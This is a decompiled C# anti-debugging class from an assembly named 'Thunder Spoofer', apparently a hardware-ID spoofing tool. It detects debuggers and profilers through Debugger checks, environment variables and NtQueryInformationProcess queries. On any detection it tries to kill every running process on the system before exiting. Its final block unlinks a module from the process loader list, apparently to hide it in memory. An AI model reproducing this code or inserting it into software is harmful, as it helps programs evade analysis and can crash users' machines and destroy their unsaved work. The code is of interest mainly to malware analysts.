
// Type: Protection.Debug
// Assembly: Thunder Spoofer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6911BFCC-B15C-4BF6-865B-4753D2D18ED6
// Assembly location: C:\Users\ADIKIBERNITIKOS\Desktop\111\1_.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Protection
{
  internal static class Debug
  {
    [DllImport("ntdll.dll", CharSet = CharSet.Auto)]
    public static extern int NtQueryInformationProcess(
      IntPtr test,
      int test2,
      int[] test3,
      int test4,
      ref int test5);

    public static void Initialize()
    {
      if (Debugger.IsLogging())
      {
        Thread.Sleep(120);
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            process.PriorityClass = ProcessPriorityClass.BelowNormal;
            process.Kill();
          }
          catch
          {
          }
        }
        Environment.Exit(0);
      }
      if (Debugger.IsAttached)
      {
        Thread.Sleep(120);
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            process.PriorityClass = ProcessPriorityClass.BelowNormal;
            process.Kill();
          }
          catch
          {
          }
        }
        Environment.Exit(0);
      }
      if (Environment.GetEnvironmentVariable("complus_profapi_profilercompatibilitysetting") != null)
      {
        Thread.Sleep(120);
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            process.PriorityClass = ProcessPriorityClass.BelowNormal;
            process.Kill();
          }
          catch
          {
          }
        }
        Environment.Exit(0);
      }
      if (string.Compare(Environment.GetEnvironmentVariable("COR_ENABLE_PROFILING"), "1", StringComparison.Ordinal) == 0)
      {
        Thread.Sleep(120);
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            process.PriorityClass = ProcessPriorityClass.BelowNormal;
            process.Kill();
          }
          catch
          {
          }
        }
        Environment.Exit(0);
      }
      if (Environment.OSVersion.Platform != PlatformID.Win32NT)
        return;
      int[] test3 = new int[6];
      int test5 = 0;
      IntPtr handle = Process.GetCurrentProcess().Handle;
      if (Debug.NtQueryInformationProcess(handle, 31, test3, 4, ref test5) == 0 && test3[0] != 1)
      {
        Thread.Sleep(120);
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            process.PriorityClass = ProcessPriorityClass.BelowNormal;
            process.Kill();
          }
          catch
          {
          }
        }
        Environment.Exit(0);
      }
      if (Debug.NtQueryInformationProcess(handle, 30, test3, 4, ref test5) == 0 && test3[0] != 0)
      {
        Thread.Sleep(120);
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            process.PriorityClass = ProcessPriorityClass.BelowNormal;
            process.Kill();
          }
          catch
          {
          }
        }
        Environment.Exit(0);
      }
      if (Debug.NtQueryInformationProcess(handle, 0, test3, 24, ref test5) != 0)
        return;
      IntPtr ptr1 = Marshal.ReadIntPtr(Marshal.ReadIntPtr((IntPtr) test3[1], 12), 12);
      Marshal.WriteInt32(ptr1, 32, 0);
      IntPtr num1 = Marshal.ReadIntPtr(ptr1, 0);
      IntPtr ptr2 = num1;
      do
      {
        ptr2 = Marshal.ReadIntPtr(ptr2, 0);
        if (Marshal.ReadInt32(ptr2, 44) == 1572886 && Marshal.ReadInt32(Marshal.ReadIntPtr(ptr2, 48), 0) == 7536749)
          goto label_53;
label_52:
        continue;
label_53:
        IntPtr num2 = Marshal.ReadIntPtr(ptr2, 8);
        IntPtr num3 = Marshal.ReadIntPtr(ptr2, 12);
        Marshal.WriteInt32(num3, 0, (int) num2);
        Marshal.WriteInt32(num2, 4, (int) num3);
        goto label_52;
      }
      while (!ptr2.Equals((object) num1));
    }
  }
}
